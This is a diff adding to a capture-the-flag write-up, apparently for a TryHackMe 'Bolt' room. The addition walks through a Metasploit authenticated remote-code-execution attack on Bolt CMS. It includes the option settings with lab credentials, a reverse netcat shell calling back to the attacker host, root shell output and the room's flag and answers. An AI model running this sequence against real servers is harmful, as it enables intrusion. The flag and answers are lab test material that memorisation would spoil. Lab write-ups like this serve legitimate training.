@@ -212,6 +212,8 @@ We can see id in URL.
 
 Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `apt update` then `apt install metasploit-framework`
 
+Ans: exploit/unix/webapp/bolt_authenticated_rce
+
 Lets Open Metasploit and Search for bolt.
 
 msf5 > search bolt
@@ -228,6 +230,161 @@ Matching Modules
 Interact with a module by name or index, for example use 1 or use exploit/unix/webapp/bolt_authenticated_rce
 
 msf5 > 
+
+Note: Restarted Machine.
+
+6. Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
+Ans: No Answer Needed.
+
+7. Look for flag.txt inside the machine.
+And: THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+msf5 > use 1
+[*] Using configured payload cmd/unix/reverse_netcat
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > show options
+
+Module options (exploit/unix/webapp/bolt_authenticated_rce):
+
+   Name                 Current Setting        Required  Description
+   ----                 ---------------        --------  -----------
+   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
+   PASSWORD                                    yes       Password to authenticate with
+   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                8000                   yes       The target port (TCP)
+   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT              8080                   yes       The local port to listen on.
+   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI            /                      yes       Base path to Bolt CMS
+   URIPATH                                     no        The URI to use for this exploit (default is random)
+   USERNAME                                    yes       Username to authenticate with
+   VHOST                                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Linux (cmd)
+
+
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > 
+
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.10.23.208
+LHOST => 10.10.23.208
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LPORT 4444
+LPORT => 4444
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.75.78
+RHOSTS => 10.10.75.78
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
+USERNAME => bolt
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
+PASSWORD => boltadmin123
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > run
+
+[*] Started reverse TCP handler on 10.10.23.208:4444 
+[*] Executing automatic check (disable AutoCheck to override)
+[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "ixzlbd".
+[*] Found 3 potential token(s) for creating .php files.
+[+] Deleted file osoxjdhcnh.php.
+[+] Deleted file algjqjpzpvne.php.
+[+] Used token d87b06a46a0a6b2cd5f675a027 to create vhljfxfhgmgg.php.
+[*] Attempting to execute the payload via "/files/vhljfxfhgmgg.php?ixzlbd=`payload`"
+[*] Command shell session 1 opened (10.10.23.208:4444 -> 10.10.75.78:37272) at 2021-07-30 16:30:49 +0100
+[!] No response, may have executed a blocking payload!
+[+] Deleted file vhljfxfhgmgg.php.
+[+] Reverted user profile back to original state.
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+ls
+index.html
+ls -la
+total 16
+drwxrwxrwx 2 501 staff 4096 Jul 30 15:30 .
+drwxr-xr-x 7 501 staff 4096 Jul 18  2020 ..
+-rw-r--r-- 1 501 staff  195 May  7  2020 .htaccess
+-rw-r--r-- 1 501 staff    4 May  7  2020 index.html
+pwd
+/home/bolt/public/files
+cd /home/bolt
+ls -la
+total 296
+drwxr-xr-x 10 bolt bolt    4096 Jul 18  2020 .
+drwxr-xr-x  3 root root    4096 Jul 18  2020 ..
+drwxr-xr-x  5  501 staff   4096 Jul 18  2020 app
+-rw-------  1 bolt bolt    1088 Jul 18  2020 .bash_history
+-rw-r--r--  1 bolt bolt     220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 bolt bolt    3771 Apr  4  2018 .bashrc
+-rw-r--r--  1  501 staff     53 May  7  2020 .bolt.yml
+drwx------  2 bolt bolt    4096 Jul 18  2020 .cache
+-rw-r--r--  1  501 staff    971 May  7  2020 composer.json
+-rw-r--r--  1  501 staff 211038 May  7  2020 composer.lock
+-rwxr-xr-x  1 root root      31 Jul 18  2020 cron
+drwxr-xr-x  2  501 staff   4096 Jul 30 15:30 extensions
+-rw-r--r--  1  501 staff    931 May  7  2020 .gitignore
+drwx------  3 bolt bolt    4096 Jul 18  2020 .gnupg
+-rw-r--r--  1  501 staff   3912 Aug 25  2018 index.php
+drwxrwxr-x  3 bolt bolt    4096 Jul 18  2020 .local
+-rw-r--r--  1 bolt bolt     807 Apr  4  2018 .profile
+drwxr-xr-x  7  501 staff   4096 Jul 18  2020 public
+-rw-r--r--  1  501 staff    345 Aug 25  2018 README.md
+-rwxr-xr-x  1 root root      41 Jul 18  2020 reboot.sh
+-rw-rw-r--  1 bolt bolt      66 Jul 18  2020 .selected_editor
+drwxr-xr-x  3  501 staff   4096 Aug 25  2018 src
+-rw-r--r--  1 bolt bolt       0 Jul 18  2020 .sudo_as_admin_successful
+drwxr-xr-x 36  501 staff   4096 Jul 18  2020 vendor
+shell
+[*] Trying to find binary(python) on target machine
+[*] Found python at 
+[*] Using `python` to pop up an interactive shell
+
+
+ls
+app
+composer.json
+composer.lock
+cron
+extensions
+index.php
+public
+README.md
+reboot.sh
+src
+vendor
+locate flag
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
+locate flag.txt 
+
+ls
+app
+composer.json
+composer.lock
+cron
+extensions
+index.php
+public
+README.md
+reboot.sh
+src
+vendor
+
+
+find / -name flag.txt -type f 2>/dev/null
+/home/flag.txt
+cat /home/flag.txt
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 
 ```
 
